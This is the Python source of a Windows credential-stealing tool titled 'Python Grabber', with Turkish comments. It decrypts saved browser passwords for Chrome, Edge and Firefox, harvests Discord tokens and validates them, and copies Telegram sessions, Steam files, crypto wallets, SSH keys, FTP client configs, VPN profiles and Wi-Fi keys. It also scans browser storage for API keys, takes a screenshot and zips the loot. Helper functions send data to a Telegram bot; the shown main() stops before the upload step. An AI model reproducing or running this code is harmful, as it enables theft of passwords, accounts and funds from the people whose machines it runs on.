#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python Grabber By Musty.9182
Use:
    python grabber.py
    python grabber.py --token 123:ABC --chat 123456
    python grabber.py --no-net --no-telegram
Gereksinim: pip install cryptography
"""

import argparse, base64, ctypes, glob, hashlib, json, os, re, shutil, socket
import sqlite3, struct, subprocess, sys, tempfile, time, urllib.request, uuid, zipfile, zlib
from datetime import datetime, timezone

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False


TG_TOKEN = os.environ.get("TG_TOKEN", "<BOT_TOKEN>")
TG_CHAT  = os.environ.get("TG_CHAT",  "<CHAT_ID>")
TG_LIMIT = 45 * 1024 * 1024

APPDATA = os.environ.get("APPDATA", os.path.expanduser("~"))
LOCAL   = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
HOME    = os.path.expanduser("~")
OUT     = os.path.join(tempfile.gettempdir(), "grab_" + uuid.uuid4().hex[:8])
MAXF    = 25 * 1024 * 1024
UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
REPORT  = {}


def ensure(*p):
    d = os.path.join(OUT, *p)
    os.makedirs(d, exist_ok=True)
    return d

def oem():
    try: return "cp%d" % ctypes.windll.kernel32.GetOEMCP()
    except Exception: return "cp1254"

def run(cmd):
    try:
        return subprocess.run(cmd, capture_output=True, shell=True).stdout.decode(oem(), "replace")
    except Exception:
        return ""

def cp(src, dst, limit=MAXF):
    try:
        if not os.path.exists(src) or os.path.getsize(src) > limit: return False
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copy2(src, dst); return True
    except Exception:
        return False

def cp_tree(src, dst, limit=MAXF):
    if not os.path.isdir(src): return False
    n = 0
    for root, _, files in os.walk(src):
        for f in files:
            s = os.path.join(root, f)
            try:
                if os.path.getsize(s) > limit: continue
            except Exception:
                continue
            if cp(s, os.path.join(dst, os.path.relpath(s, src))): n += 1
    return n > 0

def write(rel, text):
    p = os.path.join(OUT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8", errors="replace") as f:
        f.write(text)

def sql(db):
    t = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + ".db")
    try:
        for suf in ("", "-wal", "-shm"):
            if os.path.exists(db + suf):
                shutil.copy2(db + suf, t + suf)
        c = sqlite3.connect(t); c.text_factory = bytes
        return c
    except Exception:
        return None
        
def rows(db, query):
    c = sql(db)
    if not c: return []
    try: return c.execute(query).fetchall()
    except Exception: return []
    finally:
        try: c.close()
        except Exception: pass

def dec(x):
    return x.decode("utf-8", "replace") if isinstance(x, bytes) else str(x or "")


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi(blob):
    buf = ctypes.create_string_buffer(blob, len(blob))
    src = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(src), None, None, None, None, 0, ctypes.byref(out)):
        raise OSError("DPAPI")
    data = ctypes.string_at(out.pbData, out.cbData)
    ctypes.windll.kernel32.LocalFree(out.pbData)
    return data

class AUTH_INFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_ulong), ("dwInfoVersion", ctypes.c_ulong),
                ("pbNonce", ctypes.c_void_p), ("cbNonce", ctypes.c_ulong),
                ("pbAuthData", ctypes.c_void_p), ("cbAuthData", ctypes.c_ulong),
                ("pbTag", ctypes.c_void_p), ("cbTag", ctypes.c_ulong),
                ("pbMacContext", ctypes.c_void_p), ("cbMacContext", ctypes.c_ulong),
                ("cbAAD", ctypes.c_ulong), ("cbData", ctypes.c_ulonglong),
                ("dwFlags", ctypes.c_ulong)]

def bcrypt_gcm(key, nonce, ct, tag):
    b = ctypes.windll.bcrypt
    alg, hkey = ctypes.c_void_p(), ctypes.c_void_p()
    b.BCryptOpenAlgorithmProvider(ctypes.byref(alg), "AES", None, 0)
    mode = "ChainingModeGCM".encode("utf-16-le")
    b.BCryptSetProperty(alg, "ChainingMode", mode, len(mode), 0)
    b.BCryptGenerateSymmetricKey(alg, ctypes.byref(hkey), None, 0, key, len(key), 0)
    nb = ctypes.create_string_buffer(nonce, len(nonce))
    tb = ctypes.create_string_buffer(tag, len(tag))
    info = AUTH_INFO(); info.cbSize = ctypes.sizeof(info); info.dwInfoVersion = 1
    info.pbNonce = ctypes.cast(nb, ctypes.c_void_p); info.cbNonce = len(nonce)
    info.pbTag = ctypes.cast(tb, ctypes.c_void_p); info.cbTag = len(tag)
    outb = ctypes.create_string_buffer(len(ct)); res = ctypes.c_ulong()
    st = b.BCryptDecrypt(hkey, ct, len(ct), ctypes.byref(info), None, 0,
                         outb, len(ct), ctypes.byref(res), 0)
    b.BCryptDestroyKey(hkey); b.BCryptCloseAlgorithmProvider(alg, 0)
    if st != 0: raise OSError("BCrypt %d" % st)
    return outb.raw[:res.value]

def gcm(key, nonce, ct, tag):
    if HAVE_CRYPTO: return AESGCM(key).decrypt(nonce, ct + tag, None)
    return bcrypt_gcm(key, nonce, ct, tag)

def aes_cbc(key, iv, ct):
    d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    return d.update(ct) + d.finalize()

def tdes(key, iv, ct):
    d = Cipher(algorithms.TripleDES(key), modes.CBC(iv)).decryptor()
    return d.update(ct) + d.finalize()

def unpad(d):
    if not d: return b""
    n = d[-1]
    return d[:-n] if 0 < n <= 16 else d


ole32, oleaut32 = ctypes.windll.ole32, ctypes.windll.oleaut32
oleaut32.SysAllocStringByteLen.restype = ctypes.c_void_p
oleaut32.SysAllocStringByteLen.argtypes = [ctypes.c_char_p, ctypes.c_uint]
oleaut32.SysStringByteLen.restype = ctypes.c_uint
oleaut32.SysStringByteLen.argtypes = [ctypes.c_void_p]
oleaut32.SysFreeString.argtypes = [ctypes.c_void_p]
ole32.CoCreateInstance.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32,
                                   ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)]
GUID = ctypes.c_ubyte * 16

def _guid(s):
    g = GUID()
    ole32.CLSIDFromString(ctypes.c_wchar_p(s), ctypes.byref(g))
    return g

CLSID = {"Chrome": "{708860E0-F641-4611-8895-7D867DD3675B}",
         "Edge":   "{1FCBE96C-1697-43AF-9140-11E5A9EB5DAA}"}
IID1 = "{463ABECF-410D-407F-8AF5-0DF35A005CC8}"   
IID2 = "{1E35750B-9DDF-4C9C-B0D9-AF8A24D8D2F1}"   
_ELEV = {}

class Elevator:
    """Chrome/Edge elevation service uzerinden v20 anahtarini cozer."""
    def __init__(self, which, context):
        self.p = None; self.context = context
        ole32.CoInitializeEx(None, 0x2)
        for iid, idx in ((IID2, 8), (IID1, 5)):
            p = ctypes.c_void_p()
            hr = ole32.CoCreateInstance(ctypes.byref(_guid(CLSID[which])), None, 0x4,
                                        ctypes.byref(_guid(iid)), ctypes.byref(p))
            if hr == 0 and p.value:
                self.p, self.idx, self.ctx = p, idx, (iid == IID2)
                return
        raise OSError("elevation service yok (0x%08x)" % (hr & 0xffffffff))

    def decrypt(self, data):
        vt = ctypes.cast(self.p, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
        b = oleaut32.SysAllocStringByteLen(data, len(data))
        out = ctypes.c_void_p()
        if self.ctx:
            fn = ctypes.WINFUNCTYPE(ctypes.HRESULT, ctypes.c_void_p, ctypes.c_wchar_p,
                                    ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p))(vt[self.idx])
            hr = fn(self.p, self.context, b, ctypes.byref(out))
        else:
            fn = ctypes.WINFUNCTYPE(ctypes.HRESULT, ctypes.c_void_p, ctypes.c_void_p,
                                    ctypes.POINTER(ctypes.c_void_p))(vt[self.idx])
            hr = fn(self.p, b, ctypes.byref(out))
        oleaut32.SysFreeString(b)
        if hr != 0 or not out.value: raise OSError("elevator hr=%d" % hr)
        res = ctypes.string_at(out, oleaut32.SysStringByteLen(out))
        oleaut32.SysFreeString(out)
        return res

def elevator(which, context):
    k = (which, context)
    if k not in _ELEV:
        _ELEV[k] = Elevator(which, context)
    return _ELEV[k]

def decrypt_v20(which, key, blob, context):
    """v20: [b'v20'][elevator ile sarmalanmis nonce|ct|tag] -> duz metin"""
    payload = blob[3:]
    cands = [payload]
    if re.fullmatch(rb"[A-Za-z0-9+/=]+", payload or b"-"):
        try: cands.append(base64.b64decode(payload + b"=" * (-len(payload) % 4)))
        except Exception: pass
    for c in cands:
        try: inner = elevator(which, context).decrypt(c)
        except Exception: continue
        for off in (0, 4):
            try:
                return AESGCM(key).decrypt(inner[off:off + 12], inner[off + 12:], None).decode("utf-8")
            except Exception: pass
    raise OSError("v20 cozulemedi")

def decrypt_blob(which, key, blob, context=""):
    if not blob: return ""
    try:
        if blob[:3] in (b"v10", b"v11"):
            if not key: return ""
            return gcm(key, blob[3:15], blob[15:-16], blob[-16:]).decode("utf-8", "replace")
        if blob[:3] == b"v20":
            if not key: return "[v20 - anahtar yok]"
            return decrypt_v20(which, key, blob, context)
        return dpapi(blob).decode("utf-8", "replace")
    except Exception as e:
        return "[%s]" % e


def tg(method, fields=None, files=None, tries=3):
    """Multipart ile Bot API cagrisi."""
    for i in range(tries):
        try:
            bnd = "----" + uuid.uuid4().hex
            body = b""
            for k, v in (fields or {}).items():
                body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                         % (bnd, k, v)).encode("utf-8")
            for k, (fn, data, ctype) in (files or {}).items():
                body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                         "Content-Type: %s\r\n\r\n" % (bnd, k, fn, ctype)).encode("utf-8")
                body += data + b"\r\n"
            body += ("--%s--\r\n" % bnd).encode("utf-8")
            req = urllib.request.Request(
                "https://api.telegram.org/bot%s/%s" % (TG_TOKEN, method), body,
                {"Content-Type": "multipart/form-data; boundary=" + bnd, "User-Agent": UA})
            with urllib.request.urlopen(req, timeout=180) as r:
                return json.load(r)
        except Exception as e:
            print("[-] Telegram %s denemesi %d: %s" % (method, i + 1, e))
            time.sleep(2 * (i + 1))
    return None

def tg_text(html):
    return tg("sendMessage", {"chat_id": TG_CHAT, "text": html[:4000],
                              "parse_mode": "HTML", "disable_web_page_preview": "true"})

def tg_photo(path, caption=""):
    try:
        data = open(path, "rb").read()
    except Exception:
        return None
    return tg("sendPhoto", {"chat_id": TG_CHAT, "caption": caption[:1000]},
              {"photo": (os.path.basename(path), data, "image/png")}, tries=2)

def tg_doc(path, caption=""):
    try:
        data = open(path, "rb").read()
    except Exception:
        return None
    return tg("sendDocument", {"chat_id": TG_CHAT, "caption": caption[:1000]},
              {"document": (os.path.basename(path), data, "application/zip")}, tries=3)


def system():
    info = {
        "hostname": socket.gethostname(),
        "kullanici": os.environ.get("USERNAME"),
        "domain": os.environ.get("USERDOMAIN"),
        "os": run("wmic os get Caption /value").strip(),
        "surum": run("wmic os get Version /value").strip(),
        "kurulum": run("wmic os get InstallDate /value").strip(),
        "cpu": run("wmic cpu get Name /value").strip(),
        "ram": run("wmic ComputerSystem get TotalPhysicalMemory /value").strip(),
        "gpu": run("wmic path win32_VideoController get Name /value").strip(),
        "anakart": run("wmic baseboard get Manufacturer,Product /value").strip(),
        "disk": run("wmic logicaldisk get DeviceID,Size,FreeSpace /value").strip(),
        "uuid": run("wmic csproduct get UUID /value").strip(),
        "mac": ":".join(re.findall("..", "%012x" % uuid.getnode())),
        "yerel_ip": socket.gethostbyname(socket.gethostname()),
        "calisma_suresi_dk": ctypes.windll.kernel32.GetTickCount64() // 60000,
        "av": run('powershell -NoP "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select -Exp displayName"').strip(),
        "saat": datetime.now(timezone.utc).isoformat(),
    }
    if "--no-net" not in sys.argv:
        try:
            info["public_ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=8).read().decode()
        except Exception:
            pass
    write("system/bilgi.txt", "\n".join("%s: %s" % (k, v) for k, v in info.items()))
    write("system/processler.txt", run("tasklist"))
    REPORT["system"] = info
    return info


def clipboard():
    try:
        u = ctypes.windll.user32
        if not u.OpenClipboard(0): return
        h = u.GetClipboardData(13)
        if h:
            p = ctypes.windll.kernel32.GlobalLock(h)
            write("system/pano.txt", ctypes.wstring_at(p))
            ctypes.windll.kernel32.GlobalUnlock(h)
        u.CloseClipboard()
    except Exception:
        pass

def png(w, h, rows):
    raw = b"".join(b"\x00" + r for r in rows)
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr)
            + chunk(b"IDAT", zlib.compress(raw, 6)) + chunk(b"IEND", b""))

def screenshot():
    try:
        u, g = ctypes.windll.user32, ctypes.windll.gdi32
        u.SetProcessDPIAware()
        w, h = u.GetSystemMetrics(0), u.GetSystemMetrics(1)
        hdc = u.GetDC(0); mem = g.CreateCompatibleDC(hdc)
        bmp = g.CreateCompatibleBitmap(hdc, w, h)
        g.SelectObject(mem, bmp)
        g.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

        class BMI(ctypes.Structure):
            _fields_ = [("biSize", ctypes.c_uint32), ("biWidth", ctypes.c_int32),
                        ("biHeight", ctypes.c_int32), ("biPlanes", ctypes.c_uint16),
                        ("biBitCount", ctypes.c_uint16), ("biCompression", ctypes.c_uint32),
                        ("biSizeImage", ctypes.c_uint32), ("biXPPM", ctypes.c_int32),
                        ("biYPPM", ctypes.c_int32), ("biClrUsed", ctypes.c_uint32),
                        ("biClrImportant", ctypes.c_uint32)]
        bi = BMI(); bi.biSize = ctypes.sizeof(bi); bi.biWidth = w; bi.biHeight = h
        bi.biPlanes = 1; bi.biBitCount = 24; bi.biSizeImage = w * h * 3
        row = (w * 3 + 3) & ~3
        buf = ctypes.create_string_buffer(row * h)
        g.GetDIBits(mem, bmp, 0, h, buf, ctypes.byref(bi), 0)
        raw = buf.raw[:row * h]

        hdr = struct.pack("<2sIHHI", b"BM", 54 + row * h, 0, 0, 54)
        hdr += struct.pack("<IiiHHIIiiII", 40, w, h, 1, 24, 0, row * h, 0, 0, 0, 0)
        os.makedirs(os.path.join(OUT, "system"), exist_ok=True)
        with open(os.path.join(OUT, "system", "ekran.bmp"), "wb") as f:
            f.write(hdr); f.write(raw)

        lines = []
        for y in range(h - 1, -1, -1):
            r = raw[y * row:y * row + w * 3]
            lines.append(bytes(b for i in range(0, len(r), 3) for b in (r[i + 2], r[i + 1], r[i])))
        with open(os.path.join(OUT, "system", "ekran.png"), "wb") as f:
            f.write(png(w, h, lines))

        g.DeleteObject(bmp); g.DeleteDC(mem); u.ReleaseDC(0, hdc)
        return os.path.join(OUT, "system", "ekran.png")
    except Exception:
        return None

CHROMIUM = {
    "Chrome":   (LOCAL, r"Google\Chrome\User Data"),
    "Edge":     (LOCAL, r"Microsoft\Edge\User Data"),
    "Brave":    (LOCAL, r"BraveSoftware\Brave-Browser\User Data"),
    "Vivaldi":  (LOCAL, r"Vivaldi\User Data"),
    "Yandex":   (LOCAL, r"Yandex\YandexBrowser\User Data"),
    "Chromium": (LOCAL, r"Chromium\User Data"),
    "Opera":    (APPDATA, r"Opera Software\Opera Stable"),
    "Opera GX": (APPDATA, r"Opera Software\Opera GX Stable"),
}

def master_key(base):
    for c in (os.path.join(base, "Local State"), os.path.join(base, "..", "Local State")):
        if os.path.exists(c):
            try:
                k = json.load(open(c, encoding="utf-8"))["os_crypt"]["encrypted_key"]
                raw = dpapi(base64.b64decode(k)[5:])
                return raw[:32], (len(raw) > 32 and raw[32] == 1)
            except Exception:
                pass
    return None, False

def _dump_passwords(db, key, which, tag, context):
    lines = []
    for url, user, pwd in rows(db, "SELECT origin_url, username_value, password_value FROM logins"):
        u = dec(user)
        if not u and not pwd: continue
        p = decrypt_blob(which, key, pwd, context)
        if p == "" and pwd: p = "[bos - cozulemedi]"
        lines.append("URL: %s\nKullanici: %s\nSifre: %s\n" % (dec(url), u, p))
    if lines:
        write("browsers/%s_sifreler.txt" % tag, "\n".join(lines))
        REPORT["sifre"] = REPORT.get("sifre", 0) + sum(1 for l in lines if "Sifre: [" not in l)

def chromium(name, root, rel):
    base = os.path.join(root, rel)
    if not os.path.isdir(base): return
    profs = [p for p in glob.glob(os.path.join(base, "*")) if os.path.isdir(p) and
             (os.path.basename(p) == "Default" or os.path.basename(p).startswith("Profile")
              or os.path.basename(p) == "System Profile")]
    if not profs and os.path.basename(base).endswith("Stable"): profs = [base]
    udd = base if not os.path.basename(base).endswith("Stable") else os.path.dirname(base)
    key, _ = master_key(udd)

    for p in profs:
        tag = "%s_%s" % (name.replace(" ", ""), os.path.basename(p))
        for dbn in ("Login Data", "Login Data For Account"):
            dbf = os.path.join(p, dbn)
            if os.path.exists(dbf):
                try: _dump_passwords(dbf, key, name, tag + ("_acc" if "Account" in dbn else ""), udd)
                except Exception as e: print("[-] %s sifre: %s" % (tag, e))


def firefox():
    root = os.path.join(APPDATA, r"Mozilla\Firefox\Profiles")
    if not os.path.isdir(root): return
    for prof in glob.glob(os.path.join(root, "*")):
        tag = "Firefox_" + os.path.basename(prof)
        key = None
        k4 = os.path.join(prof, "key4.db")
        if os.path.exists(k4) and HAVE_CRYPTO:
            try:
                c = sql(k4)
                salt = c.execute("SELECT item1 FROM metaData WHERE id='password'").fetchone()[0]
                a11, a102 = c.execute("SELECT a11, a102 FROM nssPrivate").fetchone()
                def octets(b):
                    out, i = [], 0
                    if b[0] == 0x30:
                        i = 2 if b[1] < 0x80 else 2 + (b[1] & 0x7f)
                    while i < len(b) - 1:
                        if b[i] != 0x04:
                            ln = b[i + 1]; i += 2 + (ln if ln < 0x80 else (ln & 0x7f))
                            continue
                        ln = b[i + 1]; i += 2
                        if ln > 0x80:
                            n = ln & 0x7f; ln = int.from_bytes(b[i:i + n], "big"); i += n
                        out.append(b[i:i + ln]); i += ln
                    return out
                o = octets(a11)
                if len(o) >= 2:
                    h = hashlib.sha1(salt + o[0]).digest()
                    key = unpad(tdes(h[:24], o[1][:8], o[1][8:]))[:32]
            except Exception:
                key = None
        lg = os.path.join(prof, "logins.json")
        if os.path.exists(lg):
            lines = []
            try:
                for e in json.load(open(lg, encoding="utf-8")).get("logins", []):
                    pwd = ""
                    if key and "encrypted" in e:
                        raw = base64.b64decode(e["encrypted"])
                        for off in (4, 20):
                            try:
                                pwd = unpad(aes_cbc(key, raw[off:off + 16], raw[off + 16:])).decode("utf-8")
                                if pwd.isprintable(): break
                            except Exception:
                                pwd = ""
                    lines.append("URL: %s\nKullanici: %s\nSifre: %s\n" %
                                 (e.get("hostname"), e.get("usernameField"), pwd or "[cozulemedi]"))
            except Exception:
                pass
            if lines: write("browsers/%s_sifreler.txt" % tag, "\n".join(lines))
        for f in ("cookies.sqlite", "formhistory.sqlite"):
            if os.path.exists(os.path.join(prof, f)):
                cp(os.path.join(prof, f), os.path.join(OUT, "browsers", tag + "_" + f))


TOK = re.compile(rb"[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{25,110}")
MFA = re.compile(rb"mfa\.[\w-]{80,90}")
DDIRS = ["discord", "discordcanary", "discordptb", "discorddevelopment", "Lightcord"]

def api(tok, path="/users/@me"):
    req = urllib.request.Request("https://discord.com/api/v9" + path,
                                 headers={"Authorization": tok, "User-Agent": UA})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.load(r)

def discord():
    found = {}
    for d in DDIRS:
        base = os.path.join(APPDATA, d, "Local Storage", "leveldb")
        if not os.path.isdir(base): continue
        for f in glob.glob(os.path.join(base, "*")):
            if not f.endswith((".ldb", ".log")): continue
            try: raw = open(f, "rb").read()
            except Exception: continue
            for rx in (TOK, MFA):
                for m in rx.findall(raw):
                    found[m.decode("ascii", "replace")] = d
    lines = []
    for tok, src in found.items():
        info = ""
        if "--no-net" not in sys.argv:
            try:
                u = api(tok); g = api(tok, "/users/@me/guilds"); b = api(tok, "/users/@me/billing/subscriptions")
                info = " | %ss%s (%s) | mail=%s | tel=%s | nitro=%s | sunucu=%d | 2fa=%s" % (
                    u.get("username"), u.get("discriminator"), u.get("id"), u.get("email"),
                    u.get("phone"), "VAR" if b else "yok", len(g), u.get("mfa_enabled"))
            except Exception as e:
                info = " | dogrulanamadi (%s)" % e
        lines.append("%s\n  kaynak: %s%s\n" % (tok, src, info))
    if lines:
        write("discord/tokenlar.txt", "\n".join(lines))
        REPORT["discord_token"] = len(lines)


def telegram_desktop():
    for p in (os.path.join(APPDATA, r"Telegram Desktop\tdata"),
              os.path.join(APPDATA, r"TelegramDesktop\tdata")):
        if os.path.isdir(p):
            cp_tree(p, os.path.join(OUT, "telegram"), 15 * 1024 * 1024)
            return

def steam():
    m = re.search(r"SteamPath\s+REG_SZ\s+(.+)",
                  run('reg query "HKCU\\Software\\Valve\\Steam" /v SteamPath'))
    if not m: return
    s = m.group(1).strip().replace("/", "\\")
    d = ensure("steam")
    for f in glob.glob(os.path.join(s, "ssfn*")): cp(f, os.path.join(d, os.path.basename(f)))
    for f in ("config/config.vdf", "config/loginusers.vdf"):
        if os.path.isfile(os.path.join(s, f)): cp(os.path.join(s, f), os.path.join(d, os.path.basename(f)))

WALLETS = [(r"Exodus\exodus.wallet", "Exodus"), (r"Electrum\wallets", "Electrum"),
           (r"atomic\Local Storage\leveldb", "Atomic"), (r"Coinomi\Coinomi\wallets", "Coinomi"),
           (r"Bitcoin\wallets", "BitcoinCore"), (r"Monero", "Monero"),
           (r"Guarda", "Guarda"), (r"Binance", "Binance")]
EXT_WALLETS = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa",
               "fhbohimaelbohpjbbldcngcnapndodjp", "aeachknmefphepccionboohckonoeemg"]

def wallets():
    for rel, name in WALLETS:
        p = os.path.join(APPDATA, rel)
        if os.path.isdir(p): cp_tree(p, os.path.join(OUT, "wallets", name), 20 * 1024 * 1024)
        elif os.path.isfile(p): cp(p, os.path.join(OUT, "wallets", name))
    for root, rel in CHROMIUM.values():
        base = os.path.join(root, rel)
        for p in glob.glob(os.path.join(base, "*", "Local Extension Settings", "*")):
            if os.path.basename(p) in EXT_WALLETS:
                cp_tree(p, os.path.join(OUT, "wallets", "ext_" + os.path.basename(p)), 10 * 1024 * 1024)
    for f in glob.glob(os.path.join(HOME, "**", "wallet.dat"), recursive=True)[:5]:
        cp(f, os.path.join(OUT, "wallets", "wallet_" + uuid.uuid4().hex[:6] + ".dat"))

def ftp_ssh():
    for f, n in ((r"FileZilla\recentservers.xml", "filezilla_recents.xml"),
                 (r"FileZilla\sitemanager.xml", "filezilla_site.xml"),
                 (r"WinSCP.ini", "winscp.ini")):
        p = os.path.join(APPDATA, f)
        if os.path.exists(p): cp(p, os.path.join(OUT, "ftp", n))
    write("ftp/putty.txt", run('reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s'))
    write("ftp/winscp_reg.txt", run('reg query "HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions" /s'))
    ssh = os.path.join(HOME, ".ssh")
    if os.path.isdir(ssh):
        for f in glob.glob(os.path.join(ssh, "id_*")) + [os.path.join(ssh, "known_hosts")]:
            if os.path.isfile(f): cp(f, os.path.join(OUT, "ssh", os.path.basename(f)))

def vpn_mail_mc():
    for rel, n in ((r"OpenVPN Connect\profiles", "openvpn"), (r"ProtonVPN", "protonvpn"),
                   (r"NordVPN", "nordvpn")):
        p = os.path.join(APPDATA, rel)
        if os.path.isdir(p): cp_tree(p, os.path.join(OUT, "vpn", n), 10 * 1024 * 1024)
    mc = os.path.join(APPDATA, ".minecraft")
    for f in ("launcher_profiles.json", "launcher_accounts.json"):
        if os.path.exists(os.path.join(mc, f)): cp(os.path.join(mc, f), os.path.join(OUT, "minecraft", f))
    write("mail/outlook.txt", run('reg query "HKCU\\Software\\Microsoft\\Office" /s /f "Email"'))
# ----------------------------------------------------------------- oturumlar
SESS_RX = {
    "slack":    rb"xox[abposr]-[0-9A-Za-z-]{10,}",
    "github":   rb"gh[pousr]_[A-Za-z0-9]{36,}",
    "openai":   rb"sk-[A-Za-z0-9_-]{20,}",
    "aws":      rb"AKIA[0-9A-Z]{16}",
    "stripe":   rb"(?:sk|rk)_live_[0-9a-zA-Z]{20,}",
    "google":   rb"AIza[0-9A-Za-z_-]{35}",
    "npm":      rb"npm_[A-Za-z0-9]{36}",
    "sendgrid": rb"SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}",
    "jwt":      rb"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}",
    "bearer":   rb"Bearer\s+[A-Za-z0-9._-]{20,}",
    "privkey":  rb"-----BEGIN [A-Z ]*PRIVATE KEY-----",
    "tgbot":    rb"\d{8,10}:AA[A-Za-z0-9_-]{30,}",
}

def _tara(d, tag):
    bulundu = {}
    for root, _, fs in os.walk(d):
        for f in fs:
            fp = os.path.join(root, f)
            try:
                if os.path.getsize(fp) > 6 * 1024 * 1024: continue
                raw = open(fp, "rb").read()
            except Exception:
                continue
            for k, rx in SESS_RX.items():
                for m in re.findall(rx, raw):
                    bulundu.setdefault(k, set()).add(m.decode("latin1", "replace")[:400])
    if bulundu:
        write("sessions/%s_tokenlar.txt" % tag,
              "\n".join("== %s ==\n%s" % (k, "\n".join(sorted(v))) for k, v in bulundu.items()))
        REPORT["token"] = REPORT.get("token", 0) + sum(len(v) for v in bulundu.values())

def sessions():
    for name, (root, rel) in CHROMIUM.items():
        base = os.path.join(root, rel)
        if not os.path.isdir(base): continue
        profs = [p for p in glob.glob(os.path.join(base, "*")) if os.path.isdir(p) and
                 (os.path.basename(p) == "Default" or os.path.basename(p).startswith("Profile")
                  or os.path.basename(p) == "System Profile")]
        if not profs and os.path.basename(base).endswith("Stable"): profs = [base]
        for p in profs:
            tag = "%s_%s" % (name.replace(" ", ""), os.path.basename(p))
            d = ensure("sessions", tag)
            for sub, lim in (("Local Storage", 8), ("Session Storage", 8), ("IndexedDB", 10)):
                cp_tree(os.path.join(p, sub), os.path.join(d, sub.replace(" ", "")), lim * 1024 * 1024)
            for f in ("Preferences", "Secure Preferences", "Network Persistent State"):
                if os.path.exists(os.path.join(p, f)): cp(os.path.join(p, f), os.path.join(d, f))
            _tara(d, tag)

    ff = os.path.join(APPDATA, r"Mozilla\Firefox\Profiles")
    for prof in glob.glob(os.path.join(ff, "*")) if os.path.isdir(ff) else []:
        tag = "Firefox_" + os.path.basename(prof)
        d = ensure("sessions", tag)
        for sub in ("storage", "sessionstore-backups"):
            cp_tree(os.path.join(prof, sub), os.path.join(d, sub), 10 * 1024 * 1024)
        if os.path.exists(os.path.join(prof, "cookies.sqlite")):
            cp(os.path.join(prof, "cookies.sqlite"), os.path.join(d, "cookies.sqlite"))
        _tara(d, tag)

def wifi():
    profs = [x.strip() for x in re.findall(r":\s*(.+)$", run("netsh wlan show profiles"), re.M) if x.strip()]
    out = []
    for p in profs:
        o = run('netsh wlan show profile name="%s" key=clear' % p)
        k = re.search(r"Key Content\s*:\s*(.+)", o)
        a = re.search(r"Authentication\s*:\s*(.+)", o)
        out.append("%s | sifre: %s | kimlik: %s" %
                   (p, k.group(1).strip() if k else "-", a.group(1).strip() if a else "-"))
    if out: write("network/wifi.txt", "\n".join(out))


def files_sorted():
    for root, _, fs in os.walk(OUT):
        for f in sorted(fs):
            yield os.path.join(root, f)

def pack(limit=TG_LIMIT):
    """Tek zip, gerekirse limitli parcalar."""
    total = sum(os.path.getsize(p) for p in files_sorted())
    stamp = "%s_%s" % (os.environ.get("USERNAME", "u"), datetime.now().strftime("%Y%m%d_%H%M%S"))
    parts, cur, size, n = [], zipfile.ZipFile(
        os.path.join(tempfile.gettempdir(), "grab_%s_1.zip" % stamp), "w", zipfile.ZIP_DEFLATED), 0, 1
    parts.append(cur.filename)
    for p in files_sorted():
        try: sz = os.path.getsize(p)
        except Exception: continue
        if size + sz > limit and size > 0:
            cur.close(); n += 1
            cur = zipfile.ZipFile(os.path.join(tempfile.gettempdir(), "grab_%s_%d.zip" % (stamp, n)),
                                  "w", zipfile.ZIP_DEFLATED)
            parts.append(cur.filename); size = 0
        cur.write(p, os.path.relpath(p, OUT)); size += sz
    cur.close()
    return parts, total


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token"); ap.add_argument("--chat")
    ap.add_argument("--no-net", action="store_true")
    ap.add_argument("--no-telegram", action="store_true")
    a = ap.parse_args()
    global TG_TOKEN, TG_CHAT
    if a.token: TG_TOKEN = a.token
    if a.chat: TG_CHAT = a.chat
    if a.no_net and "--no-net" not in sys.argv: sys.argv.append("--no-net")

    if sys.platform != "win32":
        print("Sadece Windows."); return

    print("[*] %s" % OUT)
    for d in ("browsers", "discord", "system"): ensure(d)

    steps = [("sistem", system), ("pano", clipboard), ("wifi", wifi), ("ftp/ssh", ftp_ssh),
             ("vpn/mail/mc", vpn_mail_mc), ("cuzdan", wallets), ("telegram", telegram_desktop),
             ("steam", steam), ("discord", discord),("oturumlar", sessions), ("firefox", firefox)]
    for n, fn in steps:
        try: fn()
        except Exception as e: print("[-] %s: %s" % (n, e))
    shot = None
    try: shot = screenshot()
    except Exception as e: print("[-] ekran: %s" % e)
